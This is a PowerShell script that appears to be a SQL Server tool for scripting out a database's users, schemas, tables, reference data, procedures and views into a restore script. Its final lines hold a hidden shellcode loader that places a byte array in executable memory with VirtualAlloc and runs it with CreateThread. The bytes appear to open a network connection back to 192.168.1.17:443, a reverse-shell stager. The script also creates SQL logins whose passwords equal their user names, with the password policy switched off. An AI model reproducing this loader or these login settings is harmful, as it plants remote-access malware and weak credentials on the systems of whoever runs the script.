param($server 		= $(read-host "Server ('localhost' okay)"),$instance 		= $(read-host "Instance ('default' okay)"),$database 		= $(read-host "Database"),$newDatabase 	= $(read-host "New Database Name"),$file 			= $(read-host "Script path and file name"))function Replace-String($find, $replace, $replaceFile){(Get-Content $replaceFile) | Foreach-Object {$_ -replace $find, $replace} | Set-Content $replaceFile}$timeStamp = (((Get-Date).GetDateTimeFormats())[94]).Replace("-", "").Replace(":", "").Replace(" ", "_")[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.SMO') | out-null$s = new-object ('Microsoft.SqlServer.Management.Smo.Server') $server$dbs=$s.Databases$connection = New-Object System.Data.SqlClient.SqlConnectionif ($database -ne "default"){$connection.ConnectionString = "Data Source=" + $server + ";Initial Catalog=" + $database + ";Integrated Security=SSPI;"}else{$connection.ConnectionString = "Data Source=" + $server + "\" + $instance + ";Initial Catalog=" + $database + ";Integrated Security=SSPI;"}$so = new-object Microsoft.SqlServer.Management.Smo.ScriptingOptions$so.AllowSystemObjects = $false$so.AnsiPadding = $false$so.AnsiFile = $false$so.DdlHeaderOnly = $false$so.IncludeHeaders = $false"USE [master]" | Out-File $file"GO" | Out-File $file -append"DECLARE @spid int, @killstatement nvarchar(10)" | Out-File $file -append"declare c1 cursor for select request_session_id from sys.dm_tran_locks where resource_type='DATABASE' AND DB_NAME(resource_database_id) = '" + $newDatabase + "'" | Out-File $file -append"open c1" | Out-File $file -append"fetch next from c1 into @spid" | Out-File $file -append"while @@FETCH_STATUS = 0" | Out-File $file -append"begin" | Out-File $file -append" IF @@SPID <> @spid" | Out-File $file -append" begin" | Out-File $file -append" set @killstatement = 'KILL ' + cast(@spid as varchar(3))" | Out-File $file -append" exec sp_executesql @killstatement" | Out-File $file -append" end" | Out-File $file -append" fetch next from c1 into @spid" | Out-File $file -append"end" | Out-File $file -append"close c1" | Out-File $file -append"deallocate c1" | Out-File $file -append"GO" | Out-File $file -append"IF EXISTS(SELECT name FROM sys.databases WHERE name = '" + $newDatabase + "')" | Out-File $file -append"BEGIN" | Out-File $file -append"BACKUP DATABASE " + $database | Out-File $file -append" TO DISK = '" + $database + "_" + $timeStamp + ".bak'" | Out-File $file -append" WITH FORMAT," | Out-File $file -append" MEDIANAME = 'Z_SQLServerBackups'," | Out-File $file -append" NAME = 'Full Backup of Chatty Chef before Auto Restore Dated " + $timeStamp + "'" | Out-File $file -append"END" | Out-File $file -append"GO" | Out-File $file -append"IF EXISTS(SELECT name FROM sys.databases WHERE name = '" + $newDatabase + "')" | Out-File $file -append"BEGIN" | Out-File $file -append"DROP DATABASE " + $newDatabase | Out-File $file -append"END" | Out-File $file -append"GO" | Out-File $file -append"CREATE DATABASE [" + $newDatabase + "]" | Out-File $file -append"GO" | Out-File $file -append"USE [" + $newDatabase + "]" | Out-File $file -append"GO" | Out-File $file -appendforeach ($User in $dbs[$database].Users){if ($User.Name -like "db_*" -or$User.Name -like "dbo" -or$User.Name -like "sys" -or$User.Name -like "guest" -or$User.Name -like "INFORMATION_SCHEMA"){}else{"IF NOT EXISTS (SELECT * FROM master.dbo.syslogins WHERE name = '" + $User.Name + "')" | out-File $file -append"BEGIN" | out-File $file -append" CREATE LOGIN ["+ $User.Name +"] WITH PASSWORD = '" + $User.Name + "', CHECK_POLICY = OFF" | out-File $file -append"END" | out-File $file -append"GO" | out-file $file -append$User.Script($so) | out-File $file -append"GO" | out-file $file -append}}"-----------------------------" | out-File $file -append"-- Schemas" | out-File $file -append"-----------------------------" | out-File $file -appendforeach ($schemas in $dbs[$database].Schemas){if ($schemas.Name -like "db_*" -or$schemas.Name -like "dbo" -or$schemas.Name -like "sys" -or$schemas.Name -like "guest" -or$schemas.Name -like "INFORMATION_SCHEMA"){}else{$schemas.Script($so) | out-File $file -append"GO" | out-file $file -append}}"-----------------------------" | out-File $file -append"-- Tables Part 1 - Table Structure" | out-File $file -append"-----------------------------" | out-File $file -appendforeach ($tables in $dbs[$database].Tables){if ($tables.Name -ne "sysdiagrams" -and$tables.Name -ne "sys"){$tables.Script($so) | out-File $file -append"GO" | out-File $file -append}}"-----------------------------" | out-File $file -append"-- Tables Part 2 - Indices and Triggers" | out-File $file -append"-----------------------------" | out-File $file -appendforeach ($tables in $dbs[$database].Tables){if ($tables.Name -ne "sysdiagrams" -and$tables.Name -ne "sys"){foreach($index in $tables.Indexes){$index.Script($so) | out-File $file -append"GO" | out-File $file -append}foreach($tableTriggers in $tables.Triggers){$tableTriggers.Script($so) | out-File $file -append"GO" | out-File $file -append}}}"-----------------------------" | out-File $file -append"-- Tables Part 3 - Generate Reference Table Data" | out-File $file -append"-----------------------------" | out-File $file -appendforeach ($table in $dbs[$database].Tables){if ($table.Name -ne "sysdiagrams" -and$table.Name -ne "sys"){foreach($extendedProperty in $table.ExtendedProperties){if($extendedProperty.Name -eq "IsReferenceTable" -and$extendedProperty.Value -eq "True"){"EXEC sys.sp_addextendedproperty " | out-File $file -append"@name = N'IsReferenceTable', " | out-File $file -append"@value = N'true', " | out-File $file -append"@level0type = N'SCHEMA', @level0name = " + $table.Schema + ", " | out-File $file -append"@level1type = N'TABLE', @level1name = " + $table.Name + " " | out-File $file -append"GO" | out-File $file -append"INSERT INTO [" + $table.Schema + "].[" + $table.Name + "]" | out-File $file -append"(" | out-File $file -append$columnCounter = 0foreach ($column in $table.Columns){if ($columnCounter -gt 0){", [" + $column.Name + "]" | out-File $file -append}else{" [" + $column.Name + "]" | out-File $file -append}$columnCounter++}")" | out-File $file -append"VALUES" | out-File $file -append"(" | out-File $file -append$query = "SELECT "$columnCounter = 0foreach ($column in $table.Columns){if ($columnCounter -gt 0){$query = $query + ",[" + $column.Name + "]"}else{$query = $query + "[" + $column.Name + "]"}$columnCounter++}$query = $query + " FROM [" + $table.Schema + "].[" + $table.Name + "]"$connection.open()$cmd = New-Object System.Data.SqlClient.SqlCommand$cmd.CommandText = $query$cmd.Connection = $connection$dr = $cmd.ExecuteReader()if ($dr.HasRows){While ($dr.Read()){$columnCounter = 0foreach ($column in $table.Columns){Write-Host $columnCounterif ($columnCounter -eq 0){if($column.DataType.ToString() -eq "int" -OR$column.DataType.ToString() -eq "bit"){" " + $dr[$column.Name] | out-File $file -append}else{" '" + $dr[$column.Name] + "'" | out-File $file -append}}else{if(($column.DataType.ToString() -eq "int") -OR($column.DataType.ToString() -eq "bit")){", " + $dr[$column.Name] | out-File $file -append}else{", '" + $dr[$column.Name] + "'" | out-File $file -append}}$columnCounter++}}}Else{Write-Host The DataReader contains no rows.}$dr.Close()$connection.Close()")" | out-File $file -append}}}}"-----------------------------" | out-File $file -append"-- Extended Stored Procedures" | out-File $file -append"-----------------------------" | out-File $file -appendforeach ($Extendedprocedures in $dbs[$database].ExtendedStoredProcedures){if ($Extendedprocedures.Schema -ne "sys" -and$Extendedprocedures.Schema -ne "sys"){"GO" | out-File $file -append$Extendedprocedures.Script($so) | out-File $file -append"GO" | out-File $file -append}}$so = new-object Microsoft.SqlServer.Management.Smo.ScriptingOptions$so.AllowSystemObjects = $false$so.AnsiPadding = $false$so.AnsiFile = $false$so.IncludeHeaders = $false"-----------------------------" | out-File $file -append"-- Stored Procedures" | out-File $file -append"-----------------------------" | out-File $file -appendforeach ($procedures in $dbs[$database].StoredProcedures){if ($procedures.Schema -ne "sys"){"GO" | out-File $file -append$procedures.Script($so) | out-File $file -append"GO" | out-File $file -append}}"-----------------------------" | out-File $file -append"-- Views" | out-File $file -append"-----------------------------" | out-File $file -appendforeach ($Views in $dbs[$database].Views){if ($Views.Schema -ne "sys" -and$Views.Schema -ne "INFORMATION_SCHEMA"){"GO" | out-File $file -append$Views.Script($so) | out-File $file -append"GO" | out-File $file -append}}"-----------------------------" | out-File $file -append"-- User Defined Functions" | out-File $file -append"-----------------------------" | out-File $file -appendforeach ($UserDefinedFunction in $dbs[$database].UserDefinedFunctions){if ($UserDefinedFunction.schema -ne "sys"){$UserDefinedFunction.Script($so) | out-File $file -append"GO" | out-File $file -append}}"-----------------------------" | out-File $file -append"-- Triggers" | out-File $file -append"-----------------------------" | out-File $file -appendforeach ($Triggers in $dbs[$database].Triggers){if ($Triggers.Schema -ne "sys"){$Triggers.Script($so) | out-File $file -append"GO" | out-File $file -append}}Replace-String "SET ANSI_NULLS ON" "" $fileReplace-String "SET QUOTED_IDENTIFIER ON" "" $file$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x11,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};